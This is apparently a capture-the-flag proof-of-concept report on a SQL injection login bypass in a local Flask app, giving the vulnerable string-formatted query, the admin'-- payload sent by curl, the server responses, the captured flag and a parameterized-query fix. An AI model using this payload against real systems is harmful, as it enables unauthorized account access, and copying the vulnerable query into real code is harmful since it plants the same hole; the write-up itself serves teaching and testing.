# PoC 1 — SQL Injection (login bypass)

**Flag:** `FLAG{sqli_7645cf91ca43}`

## Vulnerability

`app.py`'s `/login` route builds the SQL query by string-formatting the raw
`username`/`password` form fields directly into the statement:

```python
query = (
    "SELECT id, username, role FROM users "
    "WHERE username = '%s' AND password = '%s'" % (username, password)
)
```

## Exploit

Submitted `username=admin'--` as the login username (anything as the
password — it's commented out). The `--` comments out the rest of the
`WHERE` clause including the password check, so the query becomes
`SELECT ... WHERE username = 'admin'--' AND password = '...'`, which matches
the `admin` row regardless of password.

```bash
curl -s -i -c cookies_sqli.txt -X POST http://127.0.0.1:5000/login \
  -d "username=admin'--&password=anything"
```

**Response:**

```
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: auth=YWRtaW46YWRtaW4=; Path=/
```

The app treats this as a successful login as `admin` and issues a session
cookie. Following the redirect with that cookie:

```bash
curl -s -i -b cookies_sqli.txt http://127.0.0.1:5000/dashboard
```

**Response body (excerpt):**

```html
<h1>Dashboard</h1>
<p>Signed in as <strong>admin</strong> (role: admin).</p>
<div class="note">
  <h2>Your private note</h2>
  <p>Nice work bypassing the login. FLAG{sqli_7645cf91ca43}</p>
</div>
```

## Remediation

Use parameterized queries instead of string formatting:

```python
row = get_db().execute(
    "SELECT id, username, role FROM users WHERE username = ? AND password = ?",
    (username, password),
).fetchone()
```

This makes the input data rather than SQL syntax, eliminating the
injection. Passwords should also be hashed (e.g. with `bcrypt`/`argon2`)
rather than stored/compared in plaintext.

**Severity:** Critical — full authentication bypass as any user, including
admin, with no credentials required.
